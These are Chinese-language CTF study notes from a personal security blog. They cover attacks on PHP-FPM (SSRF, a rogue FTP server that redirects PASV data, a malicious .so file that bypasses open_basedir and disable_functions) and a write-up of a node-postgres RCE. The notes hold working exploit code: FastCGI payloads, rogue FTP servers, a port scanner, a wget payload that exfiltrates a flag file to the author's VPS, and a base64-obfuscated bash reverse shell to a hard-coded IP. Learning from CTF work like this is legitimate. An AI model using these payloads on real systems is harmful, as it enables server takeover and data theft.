function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo $result; } function __destruct(){ $this-\u0026gt;curl($this-\u0026gt;url); } } if($_COOKIE[\u0026#34;login\u0026#34;]==\u0026#39;1\u0026#39;){ unserialize($_COOKIE[\u0026#34;crawldata\u0026#34;]); }else{ if(isset($_GET[\u0026#34;url\u0026#34;])){ $crl = new Crawl($_GET[\u0026#34;url\u0026#34;]); }else{ echo \u0026#34;no\u0026#34;; } } ?\u0026gt;用p牛脚本生成payload，直接ssrf伪协议好像也行？没环境，云一下了\n$a = new Crawl(); $a -\u0026gt; url = \u0026#34;gopher://127.0.0.1:9001/_xxxxxxxx\u0026#34;; // $a -\u0026gt; url = \u0026#34;dict://127.0.0.1:80/info\u0026#34;; // $a -\u0026gt; url = \u0026#34;file:///proc/net/arp\u0026#34;; echo urlencode(serialize($a)); 将序列化之后的结果传入crawldata\n结合ftp\u0026amp;PASV mode攻击本地php-fpm ftp使用PASV模式转发ftp-data 先简单测试ftp连接进行抓包\n其中的227 Entering Passive Mode (192,168,187,3,230,20)的括号内的内容表示的是传输的FTP-DATA打向的位置，前一部分是ip，端口是230*256+20=58900\n可以看到我们文件内容是150ok之后才被传出去的，而且会被放在FTP-DATA中被上传和下载\n我们可以模拟一个ftp-server，在响应PASV命令（即passive 切换被动模式）时返回(127,0,0,1,0,12345)来让FTP-DATA打向内网12345端口；这是一个恶意ftp-server\n# 192.168.187.1 import socket print(\u0026#34;[+] listening ...........\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 9999)) s.listen(1) conn, addr = s.accept() conn.send(b\u0026#39;220 (vsFTPd 3.0.3)\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;331 Please specify the password.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;230 Login successful.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#34;215 UNIX Type: L8\\r\\n\u0026#34;) conn.recv(0xff) conn.send(b\u0026#39;200 Switching to Binary mode.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;227 Entering Passive Mode (127,0,0,1,0,12345).\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;150 Ok to send data.\\r\\n\u0026#39;) # sending payload ..... conn.send(b\u0026#39;226 Transfer complete.\\r\\n\u0026#39;) conn.recv(0xff) conn.send(b\u0026#39;221 Goodbye.\\r\\n\u0026#39;) conn.close() print(\u0026#34;[+] completed ~~\u0026#34;) 在另一台192.168.187.3上访问这个恶意服务，期间传输的文件就会被转发到192.168.187.3自己的12345端口\nphp加载恶意.so文件 修改php.ini /etc/php/7.4/cli/php.ini\n[PHP] extension=/home/amelia/TEMP/fpm/wuhu.so C源码\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;touch /home/amelia/TEMP/fpm/pwned\u0026#34;); } 编译为.so\ngcc wuhu.c -o wuhu.so --shared -fPIC 运行php即触发恶意.so\n令php使用ftp:// /etc/php/7.4/cli/php.ini\nallow_url_fopen = On ftp读 注意后面的路径都需要绝对路径\n\u0026lt;?php @var_dump(file_get_contents($argv[1])); php ftp_read.php \u0026#39;ftp://test:test@192.168.187.3/home/test/flag.txt\u0026#39; ftp写\n\u0026lt;?php @var_dump(file_put_contents($argv[1], $agrv[2])); php ftp_write.php \u0026#39;ftp://test:test@192.168.187.3/home/test/test.txt\u0026#39; \u0026#39;hello, world\u0026#39; 但是这里一直是可以新建文件但是写入不了，读入的参数2一直是int(0)，暂时还没解决问题（不过用下面那个写入很正常……\n覆盖已存在文件\n\u0026lt;?php $context = stream_context_create(array(\u0026#39;ftp\u0026#39; =\u0026gt; array(\u0026#39;overwrite\u0026#39; =\u0026gt; true))); @var_dump(file_put_contents($argv[1], $argv[2], 0, $context)); php ftp_write_2.php \u0026#39;ftp://test:test@192.168.187.3/home/test/test.txt\u0026#39; \u0026#39;newwwwew\u0026#39; 令php使用ftp://并转发FTP-DATA 将上面的操作用wireshark抓个包看看流量\n可以看到用的是EPSV mode而不是PASV mode，不会有括号内的ip+port描述，FTP-DATA只会被打向控制连接的服务端的端口，不能做到FTP-DATA的任意转发\n不过也不是毫无办法，如果用EPSV命令返回的结果不是229，那么php的ftp://就会使用PASV命令\n将上面的ftp-server修改一下，将229响应设为了000\nimport socket print(\u0026#34;[+] listening ...........\u0026#34;) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind((\u0026#39;0.0.0.0\u0026#39;, 9999)) s.listen(1) conn, addr = s.accept() conn.send(b\u0026#39;220 (vsFTPd 3.0.3)\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;331 Please specify the password.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;230 Login successful.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;200 Switching to Binary mode.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#34;550 Could not get file size.\\r\\n\u0026#34;) print(conn.recv(0xff)) # responese with 000 , not 229 conn.send(b\u0026#39;000 use PASV then\\r\\n\u0026#39;) # then php will send PASV command print(conn.recv(0xff)) # response to PASV command conn.send(b\u0026#39;227 Entering Passive Mode (127,0,0,1,0,12345).\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;150 Ok to send data.\\r\\n\u0026#39;) # sending payload ..... conn.send(b\u0026#39;226 Transfer complete.\\r\\n\u0026#39;) print(conn.recv(0xff)) conn.send(b\u0026#39;221 Goodbye.\\r\\n\u0026#39;) conn.close() print(\u0026#34;[+] completed ~~\u0026#34;) 成功转发\n使用ftp://将payload打向fpm 结合上面几个实例应该就很清晰了，思路就是：\n 编写包含执行系统命令的恶意.so 打向fpm的一波流量，用于解开open_basedir, allow_url_include等的限制，形式是file_put_contents(\u0026lsquo;ftp://xxx\u0026rsquo;,$payload) 用file_put_contents('/tmp/wuhu.so',$_POST[\u0026lsquo;data\u0026rsquo;])的形式将.so传入 如果顺利的话open_basedir解开限制，.so被包含，就可以成功执行.so中的代码做到rce了  这里的完美栗子当然是赵总的三句话（指路赵总博客-\u0026gt;WMCTF2021-Web-Make PHP Great Again And Again WriteUp\n[WMCTF 2021]Make PHP Great Again And Again 思路先放在前面：找到fpm端口-\u0026gt;搭建恶意ftp_server 将.so文件转发至fpm端口-\u0026gt;利用.so文件执行命令-\u0026gt;拿flag\n题目代码只有三句话\n\u0026lt;?php highlight_file(__FILE__); @eval($_GET[\u0026#39;glzjin\u0026#39;]); 直接看phpinfo();会500，用get_cfg_var获取配置项\n/?glzjin=var_dump(get_cfg_var(%27disable_functions%27)); string(657) \u0026quot;stream_socket_client,fsockopen,pfsockopen,ini_alter,ini_set,ini_get,posix_kill,phpinfo,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive\u0026quot; 只能说该禁的都禁了；再康康allow_url_fopen和include\nstring(1) \u0026quot;1\u0026quot; string(0) \u0026quot;\u0026quot; 再康康open_basedir\n/?glzjin=var_dump(get_cfg_var(%27open_basedir%27)); string(14) \u0026quot;/var/www/html/\u0026quot; emmmmmmmmm 这个之后也需要绕过\n用tcp://伪协议扫一下本机开放的端口\nfor($i=0;$i\u0026lt;65535;$i++) { $t=stream_socket_server(\u0026#34;tcp://0.0.0.0:\u0026#34;.$i,$ee,$ee2); if($ee2 === \u0026#34;Address already in use\u0026#34;) { var_dump($i); } } 或者file_get_contents和error_get_last获取到请求中发出的错误进行循环判断也可以进行端口扫描\nfor($i=0;$i\u0026lt;65535;$i++) { $t=file_get_contents(\u0026#39;http://127.0.0.1:\u0026#39;.$i); if(!strpos(error_get_last()[\u0026#39;message\u0026#39;], \u0026#34;Connection refused\u0026#34;)) { var_dump($i); } } int(11451) int(37114) int(48748) 找到了fpm端口11451\n之后就续上了我们前面的思路，先在本地（也就是靶机的本地）起一个恶意的ftp_server服务用来转发FTP-DATA（即.so文件）至fpm端口（11451）；这里的exp是php版的，原理跟上面的py版是一样的\n$socket = stream_socket_server(\u0026#34;tcp://0.0.0.0:46819\u0026#34;, $errno, $errstr); if (!$socket) { echo \u0026#34;$errstr($errno)\u0026lt;br /\u0026gt;\\n\u0026#34;; } else { while ($conn = stream_socket_accept($socket)) { fwrite($conn, \u0026#34;210 Fake FTP\\n\u0026#34;); $line = fgets($conn); echo $line; // USER  fwrite($conn, \u0026#34;230 Login successful\\n\u0026#34;); $line = fgets($conn); echo $line; // TYPE  fwrite($conn, \u0026#34;200 xx\\n\u0026#34;); $line = fgets($conn); echo $line; // SIZE  fwrite($conn, \u0026#34;550 xx\\n\u0026#34;); $line = fgets($conn); echo $line; // EPSV  fwrite($conn, \u0026#34;500 wtf\\n\u0026#34;); $line = fgets($conn); echo $line; // PASV  // $ip = \u0026#39;192.168.1.4\u0026#39;;  $ip = \u0026#39;127.0.0.1\u0026#39;; $port = 11451; $porth = floor($port / 256); $portl = $port % 256; fwrite($conn, \u0026#34;227 Entering Passive Mode. \u0026#34;.str_replace(\u0026#39;.\u0026#39;,\u0026#39;,\u0026#39;,$ip).\u0026#34;,$porth,$portl\\n\u0026#34;); $line = fgets($conn); echo $line; // STOR  fwrite($conn, \u0026#34;125 GOGOGO!\\n\u0026#34;); sleep(1); fwrite($conn, \u0026#34;226 Thanks!\\n\u0026#34;); fclose($conn); } fclose($socket); } urlencode之后传入，再扫一下端口可以看到46819开放，说明服务正常；还是用之前p牛的脚本构造，这里我们要修改的配置项是这些\n'PHP_ADMIN_VALUE': 'allow_url_include = On\\nopen_basedir = /\\nextension = /tmp/wuhu.so', 覆盖掉open_basedir的原有设置，再加上.so文件（稍后上传）；具体的payload也可以用p牛的脚本魔改一下\n注释掉157-159对连接状态的判断，在191创建连接前将request部分直接输出urlencode的版本然后exit(0)一波退出\n$ python fpm.py 127.0.0.1 \u0026#39;/var/www/html/index.php\u0026#39; %01%01Mp%00%08%00%00%00%01%00%00%00%00%00%00%01%04Mp%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04Mp%00%00%00%00%01%05Mp%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05Mp%00%00%00%00 /?glzjin=eval($_POST[%27a%27]); POST: a=$payload=urldecode('%01%01%29%BE%00%08%00%00%00%01%00%00%00%00%00%00%01%04%29%BE%02%05%00%00%11%0BGATEWAY_INTERFACEFastCGI/1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0D%01DOCUMENT_ROOT/%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP/1.1%0C%10CONTENT_TYPEapplication/text%0E%02CONTENT_LENGTH25%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0F%40PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0Aopen_basedir%20%3D%20/%0Aextension%20%3D%20/tmp/wuhu.so%01%04%29%BE%00%00%00%00%01%05%29%BE%00%19%00%00%3C%3Fphp%20phpinfo%28%29%3B%20exit%3B%20%3F%3E%01%05%29%BE%00%00%00%00');var_dump(file_put_contents('ftp://127.0.0.1:46819/wuhu',$payload)); 写恶意.so\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; __attribute__ ((__constructor__)) void preload (void) { system(\u0026#34;ls / -al \u0026gt; /tmp/p1.txt\u0026#34;); system(\u0026#34;find / -perm -4000 2\u0026gt;/tmp/p2.txt\u0026#34;); system(\u0026#34;cat /flag \u0026gt; /tmp/p3.txt\u0026#34;); } gcc wuhu.c -o wuhu.so --shared -fPIC 传.so\n/?glzjin=eval($_POST[%27a%27]); POST: a=var_dump(file_put_contents('/tmp/wuhu.so',$_POST['data']));\u0026amp;data=xxxxxxxxxxxxxxxxxxx 试着执行一下命令，成功解除open_basedir的限制\n但是一样的操作之后就执行不了了……就上面这个页面，就正常出来了第一次，然后就不行了，非常的离谱啊啊啊啊啊\n正常来说，只有open_basedir被解放后才可以scandir('/')（没有的话是只可以scandir('/var/www/html')），而既然这样可以执行成功就说明开始的fpm流量一定被正常打出去了，再加上.so也被写入（我到docker上看了），那么.so一定会在php执行时被触发，一定是可以执行.so中我们写的命令的；但是现在竟然连scandir('/')都只能执行一次 ？？？？？？？后面就都失败了，更不要说.so中的命令了，肯定更是没有执行\n之后又尝试了很多次，.so正常上传，最开始打向fpm的流量也又打了几遍，失败；再之后.so也不能正常上传了，最初的那个流量也打不成了，只能回显int(xxx)，但是没有eval()的回显，说明还是不正常，然后他妈的，间或有一两次能成功，甚至我都又在/tmp目录下写了别的文件（如果前面的流量没正常打出去的话是绝对不可能做到的，肯定是bool(false)），但是但是但是又是一秒破功，真是不理解了，完全是跟前面一模一样的payload，但是就他妈玄学，吐了\n不想再耗太多时间在这个题上了，实在是绷不住了（调了快1天了），基本也算是打通了（毕竟就差一点点啊啊啊啊啊 我截图还有呢）（其实是懒的重置docker再尝试了 我的），我猜测出错的点在于那个开在46819端口的ftp服务器不稳定，它在处理这边ftp打出的流量时可能没有正常的处理，再加上来回调整payload打了太多次了，可能之前的错误累积到后面，比如某次没有urlencode之类的，搞得环境也不正常了\n***[蓝帽杯 2021]One Pointer PHP  yysy，确实没时间复现（复现赵总的题让我有心理阴影了）\n我就先云一下，对8起\n参考：wp1 | wp2\n攻击unix socket模式下的php-fpm 由于unix socket是读取/run/php/php7.4-fpm.sock进行内部通信，那必然是不能打远程，用的是stream_socket_client建立一个unix socket连接，然后写入tcp流来通信\n\u0026lt;?php $sock=stream_socket_client(\u0026#39;unix:///run/php/php7.3-fpm.sock\u0026#39;);fputs($sock,base64_decode($_POST[\u0026#39;A\u0026#39;]));var_dump(fread($sock, 4096));?\u0026gt;[*CTF 2019]Echohub 前面的pwn部分我是不太能看懂（至少目前），就简单说说后面的web部分；这里是参考wp\n从phpinfo可以看到disable_functions\nfile_get_contents,file_put_contents,fwrite,file,chmod,chown,copy,link,fflush,mkdir,popen,rename,touch,unlink,pcntl_alarm,move_upload_file,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,fsockopen,pfsockopen,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,curl_init,curl_exec,curl_multi_init,curl_multi_exec,dba_open,dba_popen,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,dl,putenv 考虑用create_function来rce，不过还是绕不过disable_functions来执行/readflag\n不过跑一下给出的docker，可以看到用unix socket模式运行的php-fpm\n题目环境安装了apache服务器和apache-module模式的php模块（这个就是题目环境），但是fpm也安装了并且启动\nfpm模式的php.ini与phpinfo中显示的不同，是独立的，disable_funtcions的限制宽松很多，我们来打它来rce，exp就是上面那个\n 拖拖拉拉四五天，总算是抽空给总结完了，对做题和学习方面又有了一些船新的理解，还是有很多收获的\n  以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（   fastcgi协议分析与实例 | php-fpm 与 Nginx优化总结\nPHP 连接方式 \u0026amp; PHP-FPM未授权访问漏洞 \u0026amp; *CTF echohub\n浅析php-fpm的攻击方式\nFastcgi协议分析 \u0026amp;\u0026amp; PHP-FPM未授权访问漏洞 \u0026amp;\u0026amp; Exp编写\n【技术分享】深入 FTP 攻击 php-fpm 绕过 disable_functions\n    一点对近况的碎碎念   最近有点自闭，看着那么多和我学习时间差不多的师傅都已经相当相当厉害了，我还是跟刚开始一样菜，满打满算学了也半年多了，怎么就这么菜呢？？？？？？？差距太大了，他妈的就是菜啊\n看看别人博客都写得啥，cve复现，漏洞挖掘，渗透实战，安全研究，我呢？全是互联网湿垃圾，没一点含金量，就会写一点wp，还大多都是参考了别人的内容，然后写一点知识总结，跟个小学生一样\n这周下了决心把没用的课的假请掉了，希望自己能好好利用起来，别摆了，真别摆了，要出大问题\n不过总结是很有必要的，现在的进度是这样：\n php反序列化：缺 原生类的学习+跟一些实际的链子 python反序列化：完 sqli：差不多完，还得多做点题加深理解 SSTI：完 文件上传：之前9月总结到一半去打hvv了 php-fpm：完 GraphQL：完  很薄弱的地方都还没掌握（这不是废话），几个急需总结掌握的：\n ssrf：不熟练 xss：做题遇到都是躲着走 js圆形污染：跟上面那个总是一起出现 xxe xsleaks  还有java，这个必须得学\n不多说了，冲！！！\n ","date":"2021-11-18T00:03:25+08:00","permalink":"https://amiaaaz.github.io/2021/11/18/attack-php-fpm-study-notes/","section":"posts","tags":["PHP","php-fpm"],"title":"攻击PHP-FPM学习笔记"},{"categories":["CTF"],"contents":"FakeWget  利用sh下grep命令正则缺陷绕过正则检查\n 这个题，就非常的可惜，具体的就不说了，太丢人了，总之十分拉跨，特别可惜，究极下饭。\n扫目录，得到/console，/wget，/flag页面得到提示flag在/flag_is_here\n/wget可以发送url进行wget的操作，跟curl一样，也是可以发送post请求滴，这里对输入的url有检测，不允许有空格和一些特殊字符\n这里其实有个原题[纵横杯 2020]magic_download，几乎是一样的，sh在grep时可以用换行的操作来绕过\npayload\nfunction senduri() { var uri = \u0026#39;http://your_vps_ip:port/\\\\n?\\t--post-file=flag_is_here\u0026#39; var encrypt = new JSEncrypt(); publicKey = \u0026#39;-----BEGIN PUBLIC KEY-----\\ MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAoFH2atPqJOH6yezxEw9s\\ eStp0j7hN3cKKlANZpAv8RRhpDxFcob47OwkyUlsJp6tdvSJBtsJ5KCNYIomdqc7\\ +f4PJvShHatMLGBRFjUkr0aunqq9LDobEHrzwSEEX6V0V+73EdbieYxFHCz2cXaB\\ MpnIK19c+u6sgVJFjZ+oggVyKuOtOUscnzzrMhOWGl+eXk+dBe0wjSTrq84zvRI1\\ 94uTehhY/8hzZjkQavV8NWq0b7l6hJHsO7mp2tGye1npYRQ/tZCEMkzO+PaAkPf6\\ H3CyuVgbdMJcuSBJT8kBRQ6P16skZIqrY+NRmdSJmMoGgR9NYVvk8soeSj4MHRpb\\ rwIDAQAB\\ -----END PUBLIC KEY-----\u0026#39;; encrypt.setPublicKey(publicKey); encryptdata = encrypt.encrypt(uri); $.post(\u0026#34;/wget\u0026#34;, { encryptdata: encryptdata }); $.get(\u0026#34;/wget\u0026#34;, {}); } EasyWAF  different cookie means node pg vuln\npay attention to the hint different cookie different means\n 他妈的 经典比赛结束找到原题，真一模一样，吐了\nhttps://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard\nhttps://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py\n#!/usr/bin/node  /** * @HITCON CTF 2017 * @Author Orange Tsai */ const qs = require(\u0026#34;qs\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); const pg = require(\u0026#34;pg\u0026#34;); const mysql = require(\u0026#34;mysql\u0026#34;); const crypto = require(\u0026#34;crypto\u0026#34;); const express = require(\u0026#34;express\u0026#34;); const pool = mysql.createPool({ connectionLimit: 100, host: \u0026#34;localhost\u0026#34;, user: \u0026#34;ban\u0026#34;, password: \u0026#34;ban\u0026#34;, database: \u0026#34;bandb\u0026#34;, }); const client = new pg.Client({ host: \u0026#34;localhost\u0026#34;, user: \u0026#34;userdb\u0026#34;, password: \u0026#34;userdb\u0026#34;, database: \u0026#34;userdb\u0026#34;, }); client.connect(); const KEYWORDS = [ \u0026#34;select\u0026#34;, \u0026#34;union\u0026#34;, \u0026#34;and\u0026#34;, \u0026#34;or\u0026#34;, \u0026#34;\\\\\u0026#34;, \u0026#34;/\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34; \u0026#34; ] function waf(string) { for (var i in KEYWORDS) { var key = KEYWORDS[i]; if (string.toLowerCase().indexOf(key) !== -1) { return true; } } return false; } const app = express(); app.use((req, res, next) =\u0026gt; { var data = \u0026#34;\u0026#34;; req.on(\u0026#34;data\u0026#34;, (chunk) =\u0026gt; { data += chunk}) req.on(\u0026#34;end\u0026#34;, () =\u0026gt;{ req.body = qs.parse(data); next(); }) }) app.all(\u0026#34;/*\u0026#34;, (req, res, next) =\u0026gt; { if (\u0026#34;show_source\u0026#34; in req.query) { return res.end(fs.readFileSync(__filename)); } if (req.path == \u0026#34;/\u0026#34;) { return next(); } var ip = req.connection.remoteAddress; var payload = \u0026#34;\u0026#34;; for (var k in req.query) { if (waf(req.query[k])) { payload = req.query[k]; break; } } for (var k in req.body) { if (waf(req.body[k])) { payload = req.body[k]; break; } } if (payload.length \u0026gt; 0) { var sql = `INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`; } else { var sql = `SELECT ?,?,?`; } return pool.query(sql, [ip, payload, payload], (err, rows) =\u0026gt; { var sql = `SELECT * FROM blacklists WHERE ip=?`; return pool.query(sql, [ip], (err,rows) =\u0026gt; { if ( rows.length == 0) { return next(); } else { return res.end(\u0026#34;Shame on you\u0026#34;); } }); }); }); app.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { var sql = `SELECT * FROM blacklists GROUP BY ip`; return pool.query(sql, [], (err,rows) =\u0026gt; { res.header(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;); var html = \u0026#34;\u0026lt;pre\u0026gt;Here is the \u0026lt;a href=/?show_source=1\u0026gt;source\u0026lt;/a\u0026gt;, thanks to Orange\\n\\n\u0026lt;h3\u0026gt;Hall of Shame\u0026lt;/h3\u0026gt;(delete every 60s)\\n\u0026#34;; for(var r in rows) { html += `${parseInt(r)+1}. ${rows[r].ip}\\n`; } return res.end(html); }); }); app.post(\u0026#34;/reg\u0026#34;, (req, res) =\u0026gt; { var username = req.body.username; var password = req.body.password; if (!username || !password || username.length \u0026lt; 4 || password.length \u0026lt; 4) { return res.end(\u0026#34;Bye\u0026#34;); } password = crypto.createHash(\u0026#34;md5\u0026#34;).update(password).digest(\u0026#34;hex\u0026#34;); var sql = `INSERT INTO users(username, password) VALUES(\u0026#39;${username}\u0026#39;, \u0026#39;${password}\u0026#39;) ON CONFLICT (username) DO NOTHING`; return client.query(sql.split(\u0026#34;;\u0026#34;)[0], (err, rows) =\u0026gt; { if (rows \u0026amp;\u0026amp; rows.rowCount == 1) { return res.end(\u0026#34;Reg OK\u0026#34;); } else { return res.end(\u0026#34;User taken\u0026#34;); } }); }); app.listen(31337, () =\u0026gt; { console.log(\u0026#34;Listen OK\u0026#34;); }); 涉及到的主要知识点有三个，一个一个说。\nCVE-2017-16082: node-progresql-rce 参考：node.js + postgres 从注入到Getshell | vulhub: node/CVE-2017-16082 | PostgreSQL 认证方式详解\ndocker中的示例app.js，之后连上docker中的app.js用vscode远程调试\nconst Koa = require(\u0026#39;koa\u0026#39;) const { Client } = require(\u0026#39;pg\u0026#39;) const app = new Koa() const client = new Client({ user: \u0026#34;postgres\u0026#34;, password: \u0026#34;postgres\u0026#34;, database: \u0026#34;example\u0026#34;, host: \u0026#34;db\u0026#34;, port: 5432 }) client.connect() app.use(async ctx =\u0026gt; { ctx.response.type = \u0026#39;html\u0026#39; let id = ctx.request.query.id || 1 let sql = `SELECT * FROM \u0026#34;user\u0026#34; WHERE \u0026#34;id\u0026#34; = ${id}` const res = await client.query(sql) ctx.body = `\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;table\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;id\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;${res.rows[0].id}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;name\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;${res.rows[0].name}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;score\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;${res.rows[0].score}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;` }) app.listen(3000) 显然17行的let sql = 语句有sql的可能，不过注意这里的可控参数在where之后而不在select之后，我们没法轻易的控制字段名，即使是用联合查询\nselect * from \u0026#34;user\u0026#34; where id=-1 union slect 1,2,3 as \u0026#34;\\\\\u0026#39;+console.log(process.enc)]=null;//\u0026#34; 第二个select后的字段名也不会被postgres返回，只会回显第一个查询结果\n但是我们可以直接执行多语句\n/?id=1;select+1+as+\u0026#34;\\\u0026#39;+console.log(process.env)]=null;//\u0026#34; 会返回500，但是已经被正常执行语句了，打印出了环境变量\n原理呢，就是经典的转义不全\nvar inlineParser = function (fieldName, i) { return \u0026#34;\\nthis[\u0026#39;\u0026#34; + // fields containing single quotes will break  // the evaluated javascript unless they are escaped  // see https://github.com/brianc/node-postgres/issues/507  // Addendum: However, we need to make sure to replace all  // occurences of apostrophes, not just the first one.  // See https://github.com/brianc/node-postgres/issues/934  fieldName.replace(/\u0026#39;/g, \u0026#34;\\\\\u0026#39;\u0026#34;) + \u0026#34;\u0026#39;] = \u0026#34; + \u0026#39;rowData[\u0026#39; + i + \u0026#39;] == null ? null : parsers[\u0026#39; + i + \u0026#39;](rowData[\u0026#39; + i + \u0026#39;]);\u0026#39; } fileName就是字段名，只对单引号前加反斜杠fileName.replace(/'/g, \u0026quot;\\\\'\u0026quot;)，我们只要再加一个反斜杠就能逃逸了，所以我们就有了可控的字段名\n我们上面的payload传入之后会是这样\n\u0026#39;SELECT * FROM \u0026#34;user\u0026#34; WHERE \u0026#34;id\u0026#34; = 1;select 1 as \u0026#34;\\\\\u0026#39; console.log(process.env)]=null;//\u0026#34;\u0026#39; 诶，闭合了；如果在中间解析的地方下断点，可以看到传入Function类的函数体ctorBody值为\nthis[\u0026#39;\\\\\u0026#39;+console.log(process.env)]=null;//\u0026#39;] = rowData[0] == null ? null : parsers[0](rowData[0]); 确实，执行的就是我们的恶意语句\n构造反弹shell的poc，执行即可反弹shell（不成功的话记得把urlencode的special chars勾上）\n/?id=1;SELECT 1 AS \u0026#34;\\\u0026#39;]=0;require=process.mainModule.constructor._load;/*\u0026#34;, 2 AS \u0026#34;*/p=require(`child_process`);/*\u0026#34;, 3 AS \u0026#34;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*\u0026#34;, 4 AS \u0026#34;*/`cC8xMDEuMzUuMTE0LjEwNy84NDI2IDA+JjE=|base64 -d|bash`)//\u0026#34; 其中核心payload分割后用b64编码+反引号来执行语句；Function环境下没有require()函数，不能获得child_process模块，使用process.mainModule.constructor._load来代替require\n修复方法是将fileName.replace(/'/g, \u0026quot;\\\\'\u0026quot;)修改为escape(fileName)，对大部分有问题字符进行转义\nmysql的max_allowed_packet 默认最大16M，超过则关闭连接不执行sql语句，不会把我们此次查询的记录保留下来，可以绕过waf\npostgresql特殊语句 